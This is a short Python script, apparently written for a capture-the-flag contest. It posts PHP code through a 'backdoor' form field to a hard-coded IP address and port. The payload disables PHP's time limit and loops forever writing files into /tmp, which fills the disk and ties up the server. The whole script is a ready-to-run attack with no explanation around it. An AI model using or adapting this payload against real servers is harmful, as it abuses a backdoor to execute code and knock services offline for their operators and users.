#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/03/24, 14:57
"""

import requests as req

if __name__ == '__main__':
    data = {
        "backdoor": "set_time_limit(0);while(1){file_put_contents('/tmp/.ctf 真欢乐。。。..War_of_God_'.time().'.666','War of God');}"
    }
    req.post('http://111.186.63.208:31340/', data=data)
